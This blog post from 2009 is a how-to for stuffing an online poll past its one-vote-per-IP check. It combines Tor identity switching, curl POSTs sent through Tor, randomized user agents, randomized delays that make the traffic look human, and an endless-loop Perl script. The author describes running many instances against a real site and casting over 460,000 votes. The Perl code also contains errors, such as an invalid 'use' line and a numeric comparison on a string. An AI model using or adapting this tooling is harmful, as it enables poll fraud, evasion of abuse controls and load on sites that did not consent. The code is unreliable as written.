---
tags:
- hacking
- software
- learning
date: 2009-07-10T00:00:00Z
description: "Proof that an IP address check is little more than thin air security to a voting engine."
title: How to use Perl, Tor, and cURL to game an IP check voting engine
url: /chronicle/2009/07/10/how-to-use-perl-tor-and-curl-to-game-an-ip-check-voting-engine/
---

Every once in a while I like to spend some time looking at a problem that isn't even a problem.  Maybe it's a proof of concept, maybe it's something that just vastly has the potential to be something more.  Other times, maybe I just want to game the system just because I can.  I can have fun too.

Gaming online voting has been around since the invention of online voting.  The most notable by far is what the folks at 4chan did to the Time 100 poll (see <a href="http://musicmachinery.com/2009/04/15/inside-the-precision-hack/">here</a>, <a href="http://musicmachinery.com/2009/04/27/moot-wins-time-inc-loses/">here</a>, <a href="http://blogs.wsj.com/digits/2009/04/27/moot-4chan-founder-takes-time-100-poll/">here</a>).  The follow technique pales in comparison, but then again, I'm a simple sort of guy.  My target did not need as much sophistication.

The site in question (which shall remain nameless) had some 50 candidates (ideas one might call them) that could receive votes.  Let's presume for a moment that one of those candidates I wish to vote for. A lot.  So I go the web site, load up <a href="http://getfirebug.com/">Firebug</a> and click "Vote" to see what happens.  Oh look at that, it does a little AJAX post using <a href="http://jquery.com/">jQuery</a> (which I know all too well) to a voting script on their server.  I see what vars it it sends in the POST and I see the JSON response it returns.  I click vote again and it posts the same info, but returns a message that I voted already today.  Humm, looks like an IP address check.  What's a guy to do?

Time to load up <a href="http://www.torproject.org/">Tor</a>. For those of you who don't know Tor, Tor can be used with a browser to give you a certain degree of anonymity online by using a distributed network of relays run by volunteers.  You may have heard of Tor recently, given that the Electronic Frontier Foundation called upon users to run a relay to <a href="http://www.eff.org/deeplinks/2009/06/help-protesters-iran-run-tor-relays-bridges">help support protests in Iran</a>.

To test my IP address restriction theory, I ran Tor, submitted vote again, and it worked.  I changed Tor identities (like getting a new IP address) and submitted a vote again.  It worked.  Great, I could sit here all day long and change identities and submit.  But that takes way too long.  Let's script it.

I set this up on Linux.  You could probably setup the same thing on Windows, but I'm not going to speak to that.  So you've installed Tor on Linux, and you think happy days.  How does one change the identity on the command line?  I used <a href="http://ge.mine.nu/tor-ctrl.sh.html">tor-ctrl.sh</a> written by Stefan Behte.  Once you have the script setup (I'm not going to explain it given Stefan has instructions on his site), it's a simple command:

{{< codeblock lang="bash" >}}./tor-ctrl.sh -c "signal NEWNYM"{{< /codeblock >}}

Since we can now change our identity at will, lets work on the POST. How to do this on the command line?  <a href="http://curl.haxx.se/">cURL</a>.  Curl is the best thing since sliced bread.  It has so many options I highly suggest you read the <a href="http://curl.haxx.se/docs/manpage.html">manpage</a>.  How to fire it off at our target:

{{< codeblock lang="bash" >}}curl -s --socks4a localhost:9050 -e {YOUR_REFERER} -d '{POST_VARS}' -A '{USER_AGENT}' {TARGET_SCRIPT}{{< /codeblock >}}

What exactly is that piece of command line gold doing? Let's break it down.

* "-s" is to make curl run in mute, with no error message or progress meter.
* "--socks4a localhost:9050" makes curl run through Tor (yes, you can do this a different way, it's just the way I chose to do it).
* "-e {YOUR_REFERER}" is URL where you want to be coming from, say the actual voting page URL (http://example.com/somepage).
* "-d '{POST_VARS}'" would be your actual data that you want to submit to the script (example data: "candidate=27&submit=1")
* -A '{USER_AGENT}' is the "browser" you're using
* {TARGET_SCRIPT} the actual script you're posting to


This simple command will submit a single vote to a target and return what ever the target script has to offer.  But that's a single vote, and it's not integrated with the Tor identity switcher.  That's where Perl comes in.

I like Perl a lot.  I've written lots of tools and little scripts over the years in Perl, namely because it's fast.  You're about to read one of the simplest scripts ever.  There is nothing fancy about, it simply takes the two pieces above, adds in a random user agent via <a href="http://search.cpan.org/dist/WWW-UserAgent-Random/lib/WWW/UserAgent/Random.pm">WWW::UserAgent::Random</a>, and runs everything in an infinite loop.

{{< codeblock lang="perl" >}}
#  User agent random action
use WWW-UserAgent-Random;

# my vote counter
 $votes = 0;

 #infinite loop that makes the magic happen
 while(1)
 {
  print("Running.....");

  # setup random user agent
  my $user_agent = rand_ua("windows");

  # set new TOR route
  $setip = `./tor-ctrl.sh -c "signal NEWNYM"`;

  # submit vote
  $reply = `curl -s --socks4a localhost:9050 -e {YOUR_REFER} -d '{POST_VARS}' -A '$user_agent' {TARGET_SCRIPT}`;

        # check JSON reply
  if ($reply == '{"good":"yipee"}')
  {
    $votes++;
    $message = "Voted!";
  }
  else
  {
    $message = "No vote!";
  }

  # between 10-100 seconds; lower numbers, faster submits
  $sleeptime = int(rand(90)) + 10;

  print("$message Total: $votes Sleeping for $sleeptime seconds. DEBUG: $reply \n");

  # lets sleep for a bit
  sleep ($sleeptime);
 }
{{< /codeblock >}}

Could you run this right now on your system?  No.  You'd have to modify the counter for one thing, among changing out the cURL vars. Truth be told in my running script, I ran a custom version of WWW::UserAgent::Random with a lot more random user agent strings for what I was doing.  Most people I've shown the script to really like the little random sleep timer.  Everyone thinks it looks more "real" as opposed to say just removing the sleep timer and pounding the server with votes (which you could do).

So does this script actaully work?  See screenshot of script(s) in action:

<img decoding="async" loading="lazy" width="800" height="538" style="background-size: cover;
          background-image: url('data:image/svg+xml;charset=utf-8,%3Csvg xmlns=\'http%3A//www.w3.org/2000/svg\' xmlns%3Axlink=\'http%3A//www.w3.org/1999/xlink\' viewBox=\'0 0 1280 853\'%3E%3Cfilter id=\'b\' color-interpolation-filters=\'sRGB\'%3E%3CfeGaussianBlur stdDeviation=\'.5\'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type=\'discrete\' tableValues=\'1 1\'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter=\'url(%23b)\' x=\'0\' y=\'0\' height=\'100%25\' width=\'100%25\' xlink%3Ahref=\'data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAGCAIAAACepSOSAAAACXBIWXMAAC4jAAAuIwF4pT92AAAAs0lEQVQI1wGoAFf/AImSoJSer5yjs52ktp2luJuluKOpuJefsoCNowB+kKaOm66grL+krsCnsMGrt8m1u8mzt8OVoLIAhJqzjZ2tnLLLnLHJp7fNmpyjqbPCqLrRjqO7AIeUn5ultaWtt56msaSnroZyY4mBgLq7wY6TmwCRfk2Pf1uzm2WulV+xmV6rmGyQfFm3nWSBcEIAfm46jX1FkH5Djn5AmodGo49MopBLlIRBfG8yj/dfjF5frTUAAAAASUVORK5CYII=\'%3E%3C/image%3E%3C/svg%3E');" src="https://storage.googleapis.com/jdr-public-imgs/blog-archive/2009/07/example-run.jpg" alt="Example Run Script...keep voting!">

As you can see, I've got the script running on three different servers. To really test it, between me and some folks I know, it was at one point running at least 20 instances of the script and submitted a grand total of over 460,000 votes to the target.

The true moral of this story is that using an IP check is not a good means to eliminate voting scripts and bots.  The other moral of this story is if the vote counts are not made public, you can pick any one you want as the winner.
